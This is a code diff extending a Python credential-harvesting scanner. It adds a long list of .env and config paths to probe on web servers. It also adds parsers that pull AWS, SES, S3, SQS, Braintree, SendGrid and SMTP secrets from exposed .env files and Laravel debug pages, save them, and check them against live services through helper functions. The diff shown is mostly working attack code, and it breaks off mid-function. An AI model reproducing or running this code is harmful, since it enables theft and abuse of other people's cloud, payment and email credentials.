@@ -77,7 +77,94 @@ except:
         '/public/.env',
         '/[DOMAIN]/.env'
         ''
-        '/phpinfo', '/php_info', '/_profiler/phpinfo', '/phpinfo.php', '/info.php',
+        '/phpinfo', '/php_info', '/_profiler/phpinfo', '/phpinfo.php', '/info.php', "/backend/.env", "/project/.env", "/.env", "/adm/.env.bak", "/adm/.env", "/adm/config.env",
+        "/adm/.env.dist", "/adm/.env.dev", "/adm/.env.local", "/admin/.env.bak", "/admin/.env",
+        "/admin/config.env", "/admin/.env.dist", "/admin/.env.dev", "/admin/.env.local", "/admins/.env.bak",
+        "/admins/.env", "/admins/config.env", "/admins/.env.dist", "/admins/.env.dev", "/admins/.env.local",
+        "/administration/.env.bak", "/administration/.env", "/administration/config.env",
+        "/administration/.env.dist", "/administration/.env.dev", "/administration/.env.local", "/api/.env.bak",
+        "/api/.env", "/api/config.env", "/api/.env.dist", "/api/.env.dev", "/api/.env.local", "/app/.env.bak",
+        "/app/.env", "/app/config.env", "/app/.env.dist", "/app/.env.dev", "/app/.env.local", "/apis/.env.bak",
+        "/apis/.env", "/apis/config.env", "/apis/.env.dist", "/apis/.env.dev", "/apis/.env.local", "/back/.env.bak",
+        "/back/.env", "/back/config.env", "/back/.env.dist", "/back/.env.dev", "/back/.env.local", "/backend/.env.bak",
+        "/backend/config.env", "/backend/.env.dist", "/backend/.env.dev", "/backend/.env.local", "/backup/.env.bak",
+        "/backup/.env", "/backup/config.env", "/backup/.env.dist", "/backup/.env.dev", "/backup/.env.local",
+        "/beta/.env.bak", "/beta/.env", "/beta/config.env", "/beta/.env.dist", "/beta/.env.dev", "/beta/.env.local",
+        "/bot/.env.bak", "/bot/.env", "/bot/config.env", "/bot/.env.dist", "/bot/.env.dev", "/bot/.env.local",
+        "/client/.env.bak", "/client/.env", "/client/config.env", "/client/.env.dist", "/client/.env.dev",
+        "/client/.env.local", "/conf/.env.bak", "/conf/.env", "/conf/config.env", "/conf/.env.dist", "/conf/.env.dev",
+        "/conf/.env.local", "/config/.env.bak", "/config/.env", "/config/config.env", "/config/.env.dist",
+        "/config/.env.dev", "/config/.env.local", "/common/.env.bak", "/common/.env", "/common/config.env",
+        "/common/.env.dist", "/common/.env.dev", "/common/.env.local", "/crm/.env.bak", "/crm/.env", "/crm/config.env",
+        "/crm/.env.dist", "/crm/.env.dev", "/crm/.env.local", "/current/.env.bak", "/current/.env",
+        "/current/config.env", "/current/.env.dist", "/current/.env.dev", "/current/.env.local", "/cron/.env.bak",
+        "/cron/.env", "/cron/config.env", "/cron/.env.dist", "/cron/.env.dev", "/cron/.env.local", "/cms/.env.bak",
+        "/cms/.env", "/cms/config.env", "/cms/.env.dist", "/cms/.env.dev", "/cms/.env.local", "/client/.env.bak",
+        "/client/.env", "/client/config.env", "/client/.env.dist", "/client/.env.dev", "/client/.env.local",
+        "/default/.env.bak", "/default/.env", "/default/config.env", "/default/.env.dist", "/default/.env.dev",
+        "/default/.env.local", "/demo/.env.bak", "/demo/.env", "/demo/config.env", "/demo/.env.dist", "/demo/.env.dev",
+        "/demo/.env.local", "/deploy/.env.bak", "/deploy/.env", "/deploy/config.env", "/deploy/.env.dist",
+        "/deploy/.env.dev", "/deploy/.env.local", "/deployment/.env.bak", "/deployment/.env", "/deployment/config.env",
+        "/deployment/.env.dist", "/deployment/.env.dev", "/deployment/.env.local", "/dev/.env.bak", "/dev/.env",
+        "/dev/config.env", "/dev/.env.dist", "/dev/.env.dev", "/dev/.env.local", "/developer/.env.bak",
+        "/developer/.env", "/developer/config.env", "/developer/.env.dist", "/developer/.env.dev",
+        "/developer/.env.local", "/development/.env.bak", "/development/.env", "/development/config.env",
+        "/development/.env.dist", "/development/.env.dev", "/development/.env.local", "/erp/.env.bak", "/erp/.env",
+        "/erp/config.env", "/erp/.env.dist", "/erp/.env.dev", "/erp/.env.local", "/feature/.env.bak", "/feature/.env",
+        "/feature/config.env", "/feature/.env.dist", "/feature/.env.dev", "/feature/.env.local", "/function/.env.bak",
+        "/function/.env", "/function/config.env", "/function/.env.dist", "/function/.env.dev", "/function/.env.local",
+        "/helper/.env.bak", "/helper/.env", "/helper/config.env", "/helper/.env.dist", "/helper/.env.dev",
+        "/helper/.env.local", "/info/.env.bak", "/info/.env", "/info/config.env", "/info/.env.dist", "/info/.env.dev",
+        "/info/.env.local", "/lms/.env.bak", "/lms/.env", "/lms/config.env", "/lms/.env.dist", "/lms/.env.dev",
+        "/lms/.env.local", "/lara/.env.bak", "/lara/.env", "/lara/config.env", "/lara/.env.dist", "/lara/.env.dev",
+        "/lara/.env.local", "/live/.env.bak", "/live/.env", "/live/config.env", "/live/.env.dist", "/live/.env.dev",
+        "/live/.env.local", "/laravel/.env.bak", "/laravel/.env", "/laravel/config.env", "/laravel/.env.dist",
+        "/laravel/.env.dev", "/laravel/.env.local", "/market/.env.bak", "/market/.env", "/market/config.env",
+        "/market/.env.dist", "/market/.env.dev", "/market/.env.local", "/marketing/.env.bak", "/marketing/.env",
+        "/marketing/config.env", "/marketing/.env.dist", "/marketing/.env.dev", "/marketing/.env.local",
+        "/mail/.env.bak", "/mail/.env", "/mail/config.env", "/mail/.env.dist", "/mail/.env.dev", "/mail/.env.local",
+        "/mailer/.env.bak", "/mailer/.env", "/mailer/config.env", "/mailer/.env.dist", "/mailer/.env.dev",
+        "/mailer/.env.local", "/media/.env.bak", "/media/.env", "/media/config.env", "/media/.env.dist",
+        "/media/.env.dev", "/media/.env.local", "/node/.env.bak", "/node/.env", "/node/config.env", "/node/.env.dist",
+        "/node/.env.dev", "/node/.env.local", "/nodeapi/.env.bak", "/nodeapi/.env", "/nodeapi/config.env",
+        "/nodeapi/.env.dist", "/nodeapi/.env.dev", "/nodeapi/.env.local", "/old/.env.bak", "/old/.env", "/old/config.env",
+        "/old/.env.dist", "/old/.env.dev", "/old/.env.local", "/portal/.env.bak", "/portal/.env", "/portal/config.env",
+        "/portal/.env.dist", "/portal/.env.dev", "/portal/.env.local", "/public/.env.bak", "/public/.env",
+        "/public/config.env", "/public/.env.dist", "/public/.env.dev", "/public/.env.local", "/public_html/.env.bak",
+        "/public_html/.env", "/public_html/config.env", "/public_html/.env.dist", "/public_html/.env.dev",
+        "/public_html/.env.local", "/prod/.env.bak", "/prod/.env", "/prod/config.env", "/prod/.env.dist",
+        "/prod/.env.dev", "/prod/.env.local", "/product/.env.bak", "/product/.env", "/product/config.env",
+        "/product/.env.dist", "/product/.env.dev", "/product/.env.local", "/production/.env.bak", "/production/.env",
+        "/production/config.env", "/production/.env.dist", "/production/.env.dev", "/production/.env.local",
+        "/project/.env.bak", "/project/.env", "/project/config.env", "/project/.env.dist", "/project/.env.dev",
+        "/project/.env.local", "/qa/.env.bak", "/qa/.env", "/qa/config.env", "/qa/.env.dist", "/qa/.env.dev",
+        "/qa/.env.local", "/server/.env.bak", "/server/.env", "/server/config.env", "/server/.env.dist",
+        "/server/.env.dev", "/server/.env.local", "/service/.env.bak", "/service/.env", "/service/config.env",
+        "/service/.env.dist", "/service/.env.dev", "/service/.env.local", "/services/.env.bak", "/services/.env",
+        "/services/config.env", "/services/.env.dist", "/services/.env.dev", "/services/.env.local", "/stg/.env.bak",
+        "/stg/.env", "/stg/config.env", "/stg/.env.dist", "/stg/.env.dev", "/stg/.env.local", "/stage/.env.bak",
+        "/stage/.env", "/stage/config.env", "/stage/.env.dist", "/stage/.env.dev", "/stage/.env.local",
+        "/staging/.env.bak", "/staging/.env", "/staging/config.env", "/staging/.env.dist", "/staging/.env.dev",
+        "/staging/.env.local", "/test/.env.bak", "/test/.env", "/test/config.env", "/test/.env.dist", "/test/.env.dev",
+        "/test/.env.local", "/tests/.env.bak", "/tests/.env", "/tests/config.env", "/tests/.env.dist", "/tests/.env.dev",
+        "/tests/.env.local", "/testing/.env.bak", "/testing/.env", "/testing/config.env", "/testing/.env.dist",
+        "/testing/.env.dev", "/testing/.env.local", "/user/.env.bak", "/user/.env", "/user/config.env",
+        "/user/.env.dist", "/user/.env.dev", "/user/.env.local", "/users/.env.bak", "/users/.env", "/users/config.env",
+        "/users/.env.dist", "/users/.env.dev", "/users/.env.local", "/src/.env.bak", "/src/.env", "/src/config.env",
+        "/src/.env.dist", "/src/.env.dev", "/src/.env.local", "/web/.env.bak", "/web/.env", "/web/config.env",
+        "/web/.env.dist", "/web/.env.dev", "/web/.env.local", "/website/.env.bak", "/website/.env",
+        "/website/config.env", "/website/.env.dist", "/website/.env.dev", "/website/.env.local", "/API/.env.bak",
+        "/API/.env", "/API/config.env", "/API/.env.dist", "/API/.env.dev", "/API/.env.local", "/.env", "/.env.local",
+        "/.env.production", "/.env.staging", "/backup/.env", "/public/.env", "/laravel/.env", "/erp/.env",
+        "/config.env", "/config/.env", "/beta/.env", "/live/.env", "/lms/.env", "/demo/.env", "/test/.env", "/kyc/.env",
+        "/admin/.env", "/client/.env", "/user/.env", "/usr/.env", "/api/.env", "/apis/.env", "/back/.env",
+        "/backend/.env", "/front/.env", "/frontend/.env", "/server/.env", "/app/.env", "/apps/.env", "/application/.env",
+        "/cron/.env", "/cms/.env", "/current/.env", "/dev/.env", "/developer/.env", "/develop/.env",
+        "/development/.env", "/prod/.env", "/product/.env", "/production/.env", "/portal/.env", "/stg/.env",
+        "/staging/.env", "/service/.env", "/services/.env", "/storage/.env", "/old/.env", "/new/.env", "/web/.env",
+        "/website/.env", "/market/.env", "/marketing/.env", "/media/.env", "/node/.env", "/nodeapi/.env", "/nodeweb/.env",
+        "/shop/.env", "/public_html/.env", "/xampp/.env", "/API/.env", "/APP/.env", "/BACK/.env", "/BackEnd/.env",
+        "/BACKEND/.env", "/FRONT/.env", "/FRONTEND/.env"
     ]
     for pet in path:
         open('path.txt', 'a').write(pet + '\n')
@@ -379,6 +466,22 @@ class grabber:
                                     with open('Result/SMTP/sendgrid.txt', 'a') as pow:
                                         pow.write(satu+'\n')
                                         smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
+                                oke += 1
+                            elif '.jp' in host or 'smtp.kagoya.net' in host:
+                                with open('Result/SMTP/smtpjp.txt', 'a') as pow:
+                                    pow.write(satu + '\n')
+                                if email_receiver == 'example@domain.com':
+                                    pass
+                                else:
+                                    smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
+                                oke += 1
+                            elif '.mailjet.com' in host:
+                                with open('Result/SMTP/mailjet.txt', 'a') as pow:
+                                    pow.write(satu + '\n')
+                                if email_receiver == 'example@domain.com':
+                                    pass
+                                else:
+                                    smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                                 oke += 1
                             elif '.office365.com' in host:
                                 with open('Result/SMTP/office365.txt', 'a') as pow:
@@ -917,6 +1020,225 @@ class grabber:
                             objek += 1
                 except:
                      pass
+            if 'S3_ACCESS_KEY=' in teks:
+               #try:
+                try:
+                    key = re.findall('S3_ACCESS_KEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    sec = re.findall('S3_SECRET_KEY=(.*?)\n', teks)[0]
+                    if '\r' in sec:
+                        sec = sec.replace('\r', '')
+                    else:
+                        pass
+                    if sec.startswith('"') and sec.endswith('"'):
+                        sec = sec.replace('"', '')
+                    else:
+                        pass
+                    if sec.startswith("'") and sec.endswith("'"):
+                        sec = sec.replace("'", '')
+                    else:
+                        pass
+                    if " " in sec:
+                        sec = sec.replace(' ', '')
+                    try:
+                        region = re.findall('S3_DEFAULT_REGION=(.*?)\n', teks)[0]
+                        if '\r' in region:
+                            region = region.replace('\r', '')
+                        else:
+                            pass
+                        if region.startswith('"') and region.endswith('"'):
+                            region = region.replace('"', '')
+                        else:
+                            pass
+                        if region.startswith("'") and region.endswith("'"):
+                            region = region.replace("'", '')
+                        else:
+                            pass
+                        if " " in region:
+                            region = region.replace(" ", '')
+                        if region == '' or region == '""' or region == 'null':
+                            region = 'aws_unknown_region--'
+                        else:
+                            pass
+                    except:
+                        region = 'aws_unknown_region--'
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(urlku) + "|" + str(key) + "|" + str(sec) + '|' + str(region)
+                        if region == 'aws_unknown_region--':
+                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
+                                ppp.write(asu + '\n')
+                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
+                        else:
+                            with open('Result/aws.txt', 'a') as ppp:
+                                ppp.write(asu + '\n')
+                            ceker_aws(urlku, asu.split('|')[1], asu.split('|')[2], asu.split('|')[3])
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if 'SES_ACCESS_KEY_ID=' in teks:
+               #try:
+                try:
+                    key = re.findall('SES_ACCESS_KEY_ID=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    sec = re.findall('SES_SECRET_ACCESS_KEY=(.*?)\n', teks)[0]
+                    if '\r' in sec:
+                        sec = sec.replace('\r', '')
+                    else:
+                        pass
+                    if sec.startswith('"') and sec.endswith('"'):
+                        sec = sec.replace('"', '')
+                    else:
+                        pass
+                    if sec.startswith("'") and sec.endswith("'"):
+                        sec = sec.replace("'", '')
+                    else:
+                        pass
+                    if " " in sec:
+                        sec = sec.replace(' ', '')
+                    try:
+                        region = re.findall('S3_DEFAULT_REGION=(.*?)\n', teks)[0]
+                        if '\r' in region:
+                            region = region.replace('\r', '')
+                        else:
+                            pass
+                        if region.startswith('"') and region.endswith('"'):
+                            region = region.replace('"', '')
+                        else:
+                            pass
+                        if region.startswith("'") and region.endswith("'"):
+                            region = region.replace("'", '')
+                        else:
+                            pass
+                        if " " in region:
+                            region = region.replace(" ", '')
+                        if region == '' or region == '""' or region == 'null':
+                            region = 'aws_unknown_region--'
+                        else:
+                            pass
+                    except:
+                        region = 'aws_unknown_region--'
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(urlku) + "|" + str(key) + "|" + str(sec) + '|' + str(region)
+                        if region == 'aws_unknown_region--':
+                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
+                                ppp.write(asu + '\n')
+                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
+                        else:
+                            with open('Result/aws.txt', 'a') as ppp:
+                                ppp.write(asu + '\n')
+                            ceker_aws(urlku, asu.split('|')[1], asu.split('|')[2], asu.split('|')[3])
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if 'S3_ACCESS_KEY_ID=' in teks:
+               #try:
+                try:
+                    key = re.findall('S3_ACCESS_KEY_ID=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    sec = re.findall('S3_SECRET_ACCESS_KEY=(.*?)\n', teks)[0]
+                    if '\r' in sec:
+                        sec = sec.replace('\r', '')
+                    else:
+                        pass
+                    if sec.startswith('"') and sec.endswith('"'):
+                        sec = sec.replace('"', '')
+                    else:
+                        pass
+                    if sec.startswith("'") and sec.endswith("'"):
+                        sec = sec.replace("'", '')
+                    else:
+                        pass
+                    if " " in sec:
+                        sec = sec.replace(' ', '')
+                    try:
+                        region = re.findall('S3_DEFAULT_REGION=(.*?)\n', teks)[0]
+                        if '\r' in region:
+                            region = region.replace('\r', '')
+                        else:
+                            pass
+                        if region.startswith('"') and region.endswith('"'):
+                            region = region.replace('"', '')
+                        else:
+                            pass
+                        if region.startswith("'") and region.endswith("'"):
+                            region = region.replace("'", '')
+                        else:
+                            pass
+                        if " " in region:
+                            region = region.replace(" ", '')
+                        if region == '' or region == '""' or region == 'null':
+                            region = 'aws_unknown_region--'
+                        else:
+                            pass
+                    except:
+                        region = 'aws_unknown_region--'
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(urlku) + "|" + str(key) + "|" + str(sec) + '|' + str(region)
+                        if region == 'aws_unknown_region--':
+                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
+                                ppp.write(asu + '\n')
+                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
+                        else:
+                            with open('Result/aws.txt', 'a') as ppp:
+                                ppp.write(asu + '\n')
+                            ceker_aws(urlku, asu.split('|')[1], asu.split('|')[2], asu.split('|')[3])
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
             if 'AWS_ACCESS_KEY_ID_S3=' in teks:
                 try:
                     key = re.findall('AWS_ACCESS_KEY_ID_S3=(.*?)\n', teks)[0]
@@ -1061,6 +1383,80 @@ class grabber:
                         objek += 1
                 except:
                      pass
+            if  'SQS_SECRET=' in teks:
+                try:
+                    key = re.findall('SQS_KEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if ' ' in key:
+                        key = key.replace(' ','')
+                    sec = re.findall('SQS_SECRET=(.*?)\n', teks)[0]
+                    if '\r' in sec:
+                        sec = sec.replace('\r', '')
+                    if ' ' in sec:
+                        sec = sec.replace(' ','')
+                    try:
+                        region = re.findall('SQS_REGION=(.*?)\n', teks)[0]
+                        if '\r' in region:
+                            region = region.replace('\r', '')
+                        if ' ' in region:
+                            region = region.replace(' ','')
+                        if region == '' or region == '""' or region == 'null':
+                            region = 'aws_unknown_region--'
+                    except:
+                        region = 'aws_unknown_region--'
+                    if key == 'null' or key == '' or key == '""' or sec == '':
+                        pass
+                    else:
+                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
+                        if region == 'aws_unknown_region--':
+                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
+                                ppp.write(asu + '\n')
+                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
+                        else:
+                            with open('Result/aws.txt', 'a') as ppp:
+                                ppp.write(asu + '\n')
+                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
+                        objek += 1
+                except:
+                     pass
+            if 'AWS_S3_ACCESS_KEY_ID=' in teks:
+                try:
+                    key = re.findall('AWS_S3_ACCESS_KEY_ID=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if ' ' in key:
+                        key = key.replace(' ','')
+                    sec = re.findall('AWS_S3_SECRET_ACCESS_KEY=(.*?)\n', teks)[0]
+                    if '\r' in sec:
+                        sec = sec.replace('\r', '')
+                    if ' ' in sec:
+                        sec = sec.replace(' ','')
+                    try:
+                        region = re.findall('AWS_S3_REGION=(.*?)\n', teks)[0]
+                        if '\r' in region:
+                            region = region.replace('\r', '')
+                        if ' ' in region:
+                            region = region.replace(' ','')
+                        if region == '' or region == '""' or region == 'null':
+                            region = 'aws_unknown_region--'
+                    except:
+                        region = 'aws_unknown_region--'
+                    if key == 'null' or key == '' or key == '""' or '****' in key or sec == '':
+                        pass
+                    else:
+                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
+                        if region == 'aws_unknown_region--':
+                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
+                                ppp.write(asu + '\n')
+                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
+                        else:
+                            with open('Result/aws.txt', 'a') as ppp:
+                                ppp.write(asu + '\n')
+                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
+                        objek += 1
+                except:
+                     pass
             if 'AWS_S3_KEY=' in teks:
                 try:
                     key = re.findall('AWS_S3_KEY=(.*?)\n', teks)[0]
@@ -1103,13 +1499,13 @@ class grabber:
             else:
                 return objek
          except:
-             try:
-                if '=AKIA' in teks:
+             if '=AKIA' in teks or '= AKIA' in text or 'AKIA' in text:
+                     try:
                       with open('Result/awsku.txt', 'a') as epep:
                           epep.write(urlku + '\n')
                           objek += 1
-             except:
-              pass
+                     except:
+                        pass
         elif method == 'debug':
          try:   
             if 'AWS_ACCESS_KEY_ID' in teks:
@@ -1197,12 +1593,6 @@ class grabber:
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                         objek += 1
                 except:
-                    try:
-                     if '>AKIA' in teks:
-                      with open('Result/awsku.txt', 'a') as epep:
-                          epep.write(urlku + '\n')
-                          objek += 1
-                    except:
                      pass
             if "S3_KEY" in teks:
                 try:
@@ -1232,13 +1622,36 @@ class grabber:
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                         objek += 1
                 except:
+                    pass
+            if "SQS_KEY" in teks:
+                try:
+                    key = re.findall('<td>SQS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    sec = re.findall('<td>SQS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in sec:
+                        sec = sec.replace('\r', '')
                     try:
-                     if '>AKIA' in teks:
-                      with open('Result/awsku.txt', 'a') as epep:
-                          epep.write(urlku + '\n')
-                          objek += 1
+                        region = re.findall('<td>SQS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                        if region == '' or region == '""' or region == 'null' or region == '***':
+                            region = 'aws_unknown_region--'
                     except:
-                     pass
+                        region = 'aws_unknown_region--'
+                    if key == 'null' or key == '' or key == '""' or '****' in key:
+                        pass
+                    else:
+                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
+                        if region == 'aws_unknown_region--':
+                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
+                                ppp.write(asu + '\n')
+                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
+                        else:
+                            with open('Result/aws.txt', 'a') as ppp:
+                                ppp.write(asu + '\n')
+                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
+                        objek += 1
+                except:
+                    pass
             if "AWS_S3_KEY" in teks:
                 try:
                     key = re.findall('<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
@@ -1267,25 +1680,19 @@ class grabber:
                             ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                         objek += 1
                 except:
-                    try:
-                     if '>AKIA' in teks:
-                      with open('Result/awsku.txt', 'a') as epep:
-                          epep.write(urlku + '\n')
-                          objek += 1
-                    except:
-                     pass
+                    pass
             if objek == 0:
                 return False
             else:
                 return objek
          except:
-             try:
-                if '=AKIA' in teks:
+                if '>AKIA' in teks or 'AKIA' in text:
+                     try:
                       with open('Result/awsku.txt', 'a') as epep:
                           epep.write(urlku + '\n')
                           objek += 1
-             except:
-                pass
+                     except:
+                        pass
         else:
             return False
 
@@ -1364,7 +1771,7 @@ class grabber:
                         objek += 1
                 except:
                     try:
-                     if '>AC' in teks:
+                     if '=AC' in teks or '= AC' or '="AC':
                       with open('Result/tw.txt', 'a') as epep:
                           epep.write(urlku + '\n')
                           objek += 1
@@ -1399,6 +1806,49 @@ class grabber:
             else:
                 return objek
 
+    def get_braintre(self, method, urlku, teks):
+        if method == 'env':
+            if 'BRAINTREE_PUBLIC_KEY=' in teks:
+                try:
+                    key = re.findall('BRAINTREE_PUBLIC_KEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    sec = re.findall('BRAINTREE_PRIVATE_KEY=(.*?)\n', teks)[0]
+                    if '\r' in sec:
+                        sec = sec.replace('\r', '')
+                    if key == '""' or key == 'null' or key == '':
+                        return False
+                    else:
+                        satu = clean(str(key) + "|" + str(sec))
+                        with open('Result/braintre.txt', 'a') as ff:
+                            ff.write(satu + '\n')
+                        return True
+                except:
+                    return False
+            else:
+                return False
+        elif method == 'debug':
+            if 'BRAINTREE_PUBLIC_KEY' in teks:
+                try:
+                    key = re.findall('<td>BRAINTREE_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    sec = re.findall('<td>BRAINTREE_PRIVATE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in sec:
+                        sec = sec.replace('\r', '')
+                    if key == '""' or key == 'null' or key == '' or key == '******':
+                        return False
+                    else:
+                        satu = clean(str(key) + "|" + str(sec))
+                        with open('Result/braintre.txt', 'a') as ff:
+                            ff.write(satu + '\n')
+                        return True
+                except:
+                    return False
+            else:
+                return False
+        else:
+            return False
     def get_nexmo(self, method, urlku, teks):
         if method == 'env':
             if 'NEXMO_KEY=' in teks:
@@ -1481,39 +1931,485 @@ class grabber:
         else:
             return False
     def get_sendgrid(self, method, urlku, teks):
+        objek = 0
         if method == 'env':
+         try:  
+            if 'SENDGRID_SECRET' in teks:
+               #try:
+                try:
+                    key = re.findall('SENDGRID_SECRET=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                     pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        ceker_sendgrid(str(key))
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if 'SENDGRID_API_SECRET=' in teks:
+               #try:
+                try:
+                    key = re.findall('SENDGRID_API_SECRET=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        ceker_sendgrid(str(key))
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if 'SENDGRID_API_KEY=' in teks:
+               #try:
+                try:
+                    key = re.findall('SENDGRID_API_KEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        ceker_sendgrid(str(key))
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
             if 'SENDGRID_APIKEY=' in teks:
+               #try:
                 try:
                     key = re.findall('SENDGRID_APIKEY=(.*?)\n', teks)[0]
                     if '\r' in key:
                         key = key.replace('\r', '')
-                    if key == '""' or key == 'null' or key == '':
-                        return False
                     else:
-                        satu = clean(urlku + '|' + str(key))
-                        ceker_sendgrid(urlku,satu.split('|')[1])
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        ceker_sendgrid(str(key))
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
                 except:
-                    return False
-            else:
-                return False
-        elif method == 'debug':
-            if 'SENDGRID_APIKEY' in teks:
+                     pass
+            if 'SENDGRID_KEY=' in teks:
                 try:
-                    key = re.findall('<td>SENDGRID_APIKEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    key = re.findall('SENDGRID_KEY=(.*?)\n', teks)[0]
                     if '\r' in key:
                         key = key.replace('\r', '')
-                    if key == '""' or key == 'null' or key == '' or key == '******':
-                        return False
                     else:
-                        satu = clean(urlku + '|' + str(key))
-                        ceker_sendgrid(urlku,satu.split('|')[1])
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        ceker_sendgrid(str(key))
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
